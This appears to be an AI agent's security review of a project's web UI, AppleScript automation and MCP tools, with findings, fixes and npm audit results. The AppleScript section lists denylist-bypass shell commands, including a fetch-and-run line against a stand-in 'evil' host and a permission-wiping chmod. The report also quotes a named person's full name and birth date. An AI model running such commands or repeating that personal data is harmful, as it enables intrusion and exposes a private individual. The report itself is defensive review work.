# Security Review — T-09 (Copilot security agent)

OWASP-style manual pass over `web-ui/app/api/*`, `mark-l-bridge/server.py`,
and `mcp/`, plus `npm audit` at root and in `web-ui`. Defensive review only —
no exploitation attempted, own code only.

## Summary

| # | Severity | Location | Finding | Status |
|---|----------|----------|---------|--------|
| 1 | High | `web-ui/app/api/jarvis/biometrics/route.ts` | Owner PII (full name + date of birth) hardcoded in source as the "identity challenge" answer key | **Fixed** — moved to `OWNER_FULL_NAME`/`OWNER_DOB` env vars (documented in `.env.example`), feature now returns `not_configured` when unset |
| 2 | Medium | `web-ui/lib/apple-automation.js` (`validateAppleScript`) | AppleScript passed to `osascript` was screened by a bypassable denylist (e.g. `do shell script "curl -o /tmp/x && bash /tmp/x"`, `chmod`, `launchctl`, `pkill`, base64-wrapped commands, alternate `rm` flags) | **Fixed** — allowlist only; any `do shell script` must exactly match a fixed template (screenshot, battery status); `web-ui/test/apple-automation.test.js` covers each bypass |
| 3 | Low | `mcp/tools/health.js` (`resolveProjectPath`) | The original path-confinement finding: `health_check` could target paths outside its workspace root | **Fixed** — paths are checked for lexical and symlink/junction-resolved containment; `mcp/test/health.test.js` covers traversal and external symlink escapes |
| 4 | Info | root `npm audit`, `web-ui` `npm audit` | 0 vulnerabilities (info/low/moderate/high/critical) at scan time | No action needed |
| 5 | Info | XSS / `dangerouslySetInnerHTML` | No occurrences of `dangerouslySetInnerHTML` found in `web-ui`; `dompurify` appears only in `package-lock.json` (transitive), not imported anywhere — no raw HTML-from-API rendering path was found | No action needed |
| 6 | Info | Auth/webhook code | `web-ui/app/api/auth/route.ts` and `webhook/route.ts` already use `crypto.timingSafeEqual` for PIN/password and GitHub HMAC signature comparisons; `web-ui/app/api/files/route.ts` already confines reads/writes to the user's home directory via `path.resolve` + prefix check | No action needed |

> Note: a related access-control bug (the `workflow` tool / `/workflows` nav
> route mapped to a non-existent `workflows` permission, found by the same
> `test/security-utils.test.js` this review exercised) was fixed by the QA
> agent in `ea25d75` (board: T-08) while this review was in progress —
> `tool-permissions.ts`/`title-profiles.ts` now correctly point at the real
> `n8n` permission key, so no duplicate fix was needed here. The
> `lib/ratelimit.ts` cleanup timer missing `.unref()` (same test file, same
> root cause class) was independently fixed by both agents and reconciled
> during rebase.

## Details

### 1. Hardcoded owner PII used as an "identity" factor (fixed)

`api/jarvis/biometrics/route.ts`'s `identity-challenge` action compared the
caller's answer against a literal name (`"Hisham Abulfeilat"`) and several
date-of-birth phrasings of `2001-03-02`, committed directly in source. Two
problems:

- **Privacy**: a specific person's full name and date of birth were
  permanently recorded in git history for this (public-facing) repo.
- **Weak auth factor**: because the accepted answers were visible in source,
  this "challenge" verified nothing an attacker with repo access didn't
  already know; DOB is also commonly used as a recovery factor elsewhere
  (banks, ID lookups), so leaking it is higher-impact than a typical secret.

**Fix applied**: the two accepted-answer literals were replaced with
`getOwnerIdentity()`, which reads `OWNER_FULL_NAME` / `OWNER_DOB` from the
environment (documented as blank placeholders in `.env.example`, meant for a
gitignored `.env.local`). If unset, the endpoint now returns
`{ verified: false, reason: 'not_configured' }` (HTTP 503) instead of ever
exposing or checking against literal PII. `ownerName` in the stored biometric
metadata is now derived the same way instead of the literal string.

This endpoint is already behind `isAuthorizedRequest` (a valid session is
required before the challenge even runs), so no new exposure is introduced;
the fix only removes the hardcoded PII and makes the feature a no-op until an
operator opts in via their own `.env.local`.

### 2. AppleScript shell execution (fixed)

`api/mac-control/route.ts` lets an authenticated user (permission:
`mac_control`, macOS only) send natural language that an LLM turns into
AppleScript, or submit a script directly, and runs it with `osascript`.
`validateAppleScript()` originally rejected a short list of regex patterns
(`rm -rf`, `sudo`, a `curl|wget … | sh` pipeline, …). Because that was a
denylist, any destructive shell call outside those exact patterns got
through, e.g.:

```applescript
do shell script "curl -s https://evil/x -o /tmp/x.sh && bash /tmp/x.sh"
do shell script "chmod -R 777 /Users"
do shell script "launchctl unload com.apple.something"
do shell script "pkill -9 -f ssh"
```

**Fix applied** (T-162): `validateAppleScript()` in
`web-ui/lib/apple-automation.js` is now an allowlist.

- Any script that contains `do shell script` (any case or whitespace) passes
  only if it is **identical** to one of the fixed `SHELL_SCRIPT_TEMPLATES`:
  the screenshot template and the battery-status template. Line endings are
  normalised; nothing else is pattern-matched, so appended commands, edited
  arguments, or extra lines are rejected.
- Every other script must match one of the narrow non-shell action templates
  (open URL, activate app, set volume/mute, lock screen, show desktop).
- The mac-control route returns 400 on validation failure before writing the
  temp file or calling `osacompile`/`osascript`. The JARVIS `runScript`
  path uses the same validator. The route's LLM prompt now embeds the exact
  templates, so a generated screenshot or battery script can pass.

Regression coverage in `web-ui/test/apple-automation.test.js` rejects each
bypass above plus base64-piped, `rm -fr`/`rm -r -f`,
`with administrator privileges`, mixed-case, and near-miss template variants.
It also asserts statically that the route validates before any
`osacompile`/`osascript` sink.

Trade-off: free-form AI-generated automation (Messages, Mail, Teams UI
scripting, Finder paths) is now rejected unless it matches an approved
template. Widening it needs new, reviewed templates, not a looser validator.

### 3. MCP `health_check` tool path confinement (fixed)

`resolveProjectPath(projectPath, allowedRoot)` in `mcp/tools/health.js` now
rejects paths outside the configured workspace root. It checks both lexical
containment and canonical paths, resolving symlinks and junctions on the
deepest existing ancestor so paths that do not exist yet cannot escape via a
link. `getPackageInfo()` also rejects a `package.json` symlink that resolves
outside the allowed root.

Regression coverage in `mcp/test/health.test.js` verifies that traversal paths
and symlinks pointing outside the root are rejected, including paths with a
not-yet-existing tail. It also preserves valid behavior for in-root paths,
in-root symlinks, and a workspace root reached through a symlink. The
`package.json` symlink escape is covered as well (the test skips only when
Windows permissions prevent creating a file symlink).

## npm audit results

- Root (`npm audit --json`): 0 vulnerabilities, 3 total dependencies.
- `web-ui` (`npm audit --json`): 0 vulnerabilities, 495 total dependencies.

No fixable advisories were found in either at scan time.

### mcp, tui and extension (T-168, 2026-10-02)

The CI audit gate in `.github/workflows/security.yml` now covers
`. web-ui electron-app mcp tui extension`. Each was audited with
`npm audit --omit=dev --audit-level=high`:

- `mcp`: 2 high + 5 moderate before the fix. High: `ip-address` 10.2.0
  (SSRF/trust-boundary misclassification, via `express-rate-limit` in the MCP
  SDK) and `hono` 4.12.30 (via `@hono/node-server` in the MCP SDK). Moderate:
  `qs`, `body-parser`, `express`. Fixed with `npm audit fix` (no `--force`).
  These are lockfile-only patch/minor bumps: `hono` 4.13.12,
  `@hono/node-server` 1.19.17, `ip-address` 10.7.3, `qs` 6.16.0,
  `body-parser` 1.20.8, `express` 4.22.3, `fast-uri` 3.1.8. After: **0
  vulnerabilities**. Smoke: `npm ci && npm test` passes (7 pass, 1 skip that
  needs Windows symlink rights). A stdio `initialize` + `tools/list` handshake
  against `node index.js` returns the server info and tool list.
- `tui`: 2 high + 2 moderate before the fix. `blessed-contrib` pinned its own
  nested `lodash` 4.17.23 (code injection via `_.template`, prototype pollution
  in `_.unset`/`_.omit`), and `map-canvas` pinned its own nested `xml2js`
  0.4.23 (prototype pollution). The only fix `npm audit fix` offered was a
  `--force` downgrade to `blessed-contrib` 4.8.13, which is a breaking change.
  Instead, `package.json` `overrides` pins `lodash` to `^4.18.1` and `xml2js`
  to `^0.6.2`, the versions already declared as direct dependencies. After:
  **0 vulnerabilities**. Smoke: `node --check tui/index.js` passes. In a clean
  `npm ci --omit=dev` from the lockfile, `blessed-contrib`, `map-canvas` and
  `xml2js` load and parse correctly, and `lodash` resolves to 4.18.1 everywhere.
- `extension`: **0 vulnerabilities** (1 prod dependency). No change needed.

Note: `tui/node_modules/` is still tracked in git even though `.gitignore`
ignores it. That checked-in copy is stale and predates these fixes. The
lockfile is authoritative, so run `npm ci` in `tui/` instead of relying on the
checked-in tree. Untracking it is left as a follow-up.
